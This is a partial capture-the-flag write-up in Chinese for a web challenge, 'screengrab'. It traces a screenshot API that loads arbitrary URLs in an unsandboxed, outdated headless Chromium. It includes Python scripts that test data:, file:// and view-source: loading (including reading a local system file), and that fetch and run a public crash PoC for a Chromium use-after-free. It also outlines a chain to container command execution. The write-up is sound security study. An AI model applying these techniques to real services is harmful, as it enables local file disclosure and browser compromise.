# screengrab

## 题目信息

- 类型：Web
- 题目状态：阶段性分析，已确认题目入口和浏览器利用方向
- 目标：`http://cdeployer1.2485370.xyz:8080/`
- 核心漏洞：`/api/screenshot` 将用户输入直接喂给 Playwright 的 `page.goto()`，且浏览器是无沙箱、单进程的旧版 Headless Chromium；公开的 `CVE-2026-2441` PoC 可以在这个环境里稳定打崩浏览器

## Flag

```text
暂未获取
```

## 入口与现象

题目给出的地址并不是已经启动好的实例，而是一个 challenge instancer：

```text
GET / -> 200 Challenge Instancer
POST /create -> 需要 Cloudflare Turnstile
```

2026-04-18 实测，直接提交创建请求会返回：

```text
Turnstile verification failed. Are you a bot?
```

所以没法直接自动创建远端 `screengrab` 实例，只能先结合附件做本地分析。

附件源码很小，核心后端只有一个截图接口：

```python
@app.route('/api/screenshot')
def screenshot():
    url = request.args.get('url')
    ...
    browser = p.chromium.launch(
        headless=True,
        args=[
            "--no-sandbox",
            "--disable-dev-shm-usage",
            "--disable-gpu",
            "--single-process",
            ...
        ],
    )
    page = browser.new_page()
    page.goto(url)
    page.wait_for_load_state('domcontentloaded')
    page.wait_for_timeout(1337)
    screenshot_bytes = page.screenshot()
```

这里已经能看出几个危险点：

1. `url` 没有任何协议或域名白名单。
2. Playwright 直接访问用户给定的页面。
3. 浏览器启动参数里同时开了 `--no-sandbox` 和 `--single-process`。

前端还有一个明显的反射型 XSS：

```javascript
const title = urlParams.get('title');
...
<h2 className="post-title" dangerouslySetInnerHTML={{ __html: post.title }}></h2>
```

不过继续往下看，会发现这题更关键的入口其实不是前端 XSS，而是截图接口本身可以直接吃任意 `data:` / `file:` 页面。

## 分析过程

### 1. 截图接口可以直接访问 `data:`、`file://`、`view-source:`

我先用本地 Playwright 复现题目的启动参数，验证浏览器到底接受哪些 scheme。

测试结果：

- `data:text/html,<h1>DATA OK</h1>` 可以正常渲染
- `file:///...` 可以正常打开本地文件
- `view-source:file:///...` 可以把文本文件源码直接显示出来
- `javascript:` 直接 `goto()` 会报 `ERR_ABORTED`

这意味着如果手里有浏览器 exploit，完全不需要依赖远端再托管一个恶意站点，直接把 exploit HTML 塞进 `data:` URL 里喂给 `/api/screenshot` 就够了。

### 2. 浏览器版本不是“系统 Chrome”，而是 Playwright 固定下来的旧版

本地直接读取 `navigator.userAgent`，得到的结果是：

```text
Mozilla/5.0 ... HeadlessChrome/145.0.7632.6 Safari/537.36
```

这点非常关键，因为源码里并没有固定 Chromium 版本，但 `playwright install chromium` 会拉取 Playwright 自己绑定的浏览器构建。题目实际跑的是：

```text
HeadlessChrome/145.0.7632.6
```

而不是比赛当天的最新 Chrome。

### 3. 这个浏览器版本命中公开的 `CVE-2026-2441`

公开资料显示，`CVE-2026-2441` 是 Blink CSS 引擎里 `CSSFontFeatureValuesMap` 的 use-after-free，修复版本是：

- Windows / macOS: `145.0.7632.75` 及以上
- Linux: `144.0.7559.75` 及以上

题目环境的 `145.0.7632.6` 显然落在修复前。

更重要的是，这题浏览器又额外满足两个对利用很友好的条件：

1. `--no-sandbox`
2. `--single-process`

也就是说，只要能把这个 Blink UAF 从“公开 crash PoC”推进到“可控浏览器代码执行”，就不是普通的 renderer sandbox 内执行，而是直接进入题目容器里的浏览器进程上下文。

### 4. 公开 crash PoC 可以在题目同款浏览器上直接打崩

我把公开的 `CVE-2026-2441` PoC 直接塞给本地同版本 Playwright Chromium，结果不是“页面报错”，而是整个 target 被直接打死：

```text
html_len 11809
exc TargetClosedError('Page.set_content: Target page, context or browser has been closed
Call log:
  - setting frame content, waiting until "domcontentloaded"
')
```

这说明：

1. 题目环境里确实能触发这个浏览器 1-day。
2. 这不是停留在版本碰瓷，而是本地实测能复现浏览器崩溃。

### 5. 最合理的最终利用链

结合 Dockerfile，可以推断题目预期终点应该是：

1. 用 `/api/screenshot?url=data:text/html,...` 投喂浏览器 exploit。
2. 在 `HeadlessChrome/145.0.7632.6` 上拿到浏览器代码执行。
3. 因为浏览器是 `--no-sandbox --single-process` 启动，代码执行直接落进容器内。
4. 以普通用户身份执行 `/app/read_flag`。
5. 通过写文件、回显页面或本地 HTTP 服务把结果带回截图里。

Dockerfile 里已经把最后一步准备好了：

```dockerfile
COPY --from=builder /app/read_flag ./read_flag
RUN chown root:root read_flag && chmod 4755 read_flag
RUN chown root:root flag.txt && chmod 400 flag.txt
```

这说明单纯任意读文件并不足以拿 flag，最后一定需要命令执行，再调用 setuid 的 `read_flag`。

## 利用过程

当前已确认、可复现的步骤如下：

1. 拿到附件后审源码，确认 `url` 被直接传进 `page.goto()`，而且浏览器参数是 `--no-sandbox --single-process`。
2. 本地验证 `data:`、`file://`、`view-source:` 均可被截图接口对应的 Playwright 正常处理。
3. 本地验证浏览器 UA 是 `HeadlessChrome/145.0.7632.6`。
4. 对这个浏览器直接运行公开的 `CVE-2026-2441` PoC，浏览器会被打崩。
5. 由此确认题目的主线不是前端业务逻辑，而是“任意页面加载 -> 老版本 Chromium n-day -> 容器内命令执行 -> `/app/read_flag`”。

目前还差最后一段“把 crash PoC 升级成稳定 RCE payload”的 exploit 细节，因此没有拿到远端真实 flag。

## 关键 payload / 命令

### 1. 读取浏览器版本

```python
from playwright.sync_api import sync_playwright

with sync_playwright() as p:
    browser = p.chromium.launch(headless=True, args=[
        '--no-sandbox',
        '--single-process',
    ])
    page = browser.new_page()
    page.goto('data:text/html,<script>document.write(navigator.userAgent)</script>')
    page.wait_for_timeout(500)
    print(page.locator('body').inner_text())
    browser.close()
```

输出：

```text
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/145.0.7632.6 Safari/537.36
```

### 2. 验证 `data:` / `file://` / `view-source:`

```python
tests = [
    'data:text/html,<h1>DATA OK</h1>',
    'file:///C:/Windows/win.ini',
    'view-source:file:///C:/Windows/win.ini',
]
```

这些 scheme 在本地同配置浏览器里都能成功渲染。

### 3. 复现公开的 `CVE-2026-2441` crash PoC

```python
import requests
from playwright.sync_api import sync_playwright

html = requests.get(
    'https://raw.githubusercontent.com/huseyinstif/CVE-2026-2441-PoC/main/poc.html',
    timeout=20,
).text

with sync_playwright() as p:
    browser = p.chromium.launch(headless=True, args=[
        '--no-sandbox',
        '--single-process',
        '--disable-dev-shm-usage',
        '--disable-gpu',
    ])
    page = browser.new_page()
    page.set_content(html, wait_until='domcontentloaded', timeout=10000)
```

结果：

```text
TargetClosedError: Page.set_content: Target page, context or browser has been closed
```

## 总结

这题最值得注意的不是前端那个 `dangerouslySetInnerHTML`，而是截图服务把用户内容直接送进了一个：

- 可访问任意 scheme 的 Playwright `page.goto()`
- `--no-sandbox`
- `--single-process`
- 版本固定且落在公开 1-day 修复前的 Chromium

从本地验证结果看，题目主线已经足够明确：

```text
/api/screenshot -> data: 恶意页面 -> 旧版 Chromium 1-day -> 容器命令执行 -> /app/read_flag
```

当前缺的不是“入口点”，而是浏览器 exploit 的最后一跳。只要补上可用的 `CVE-2026-2441` RCE payload，这题就能直接落到读取 `/app/read_flag`。

另外，2026-04-18 实测题目给的外链仍然是 instancer 首页，且创建实例前必须通过 Cloudflare Turnstile，所以自动化阶段没法直接验证远端真实 flag。
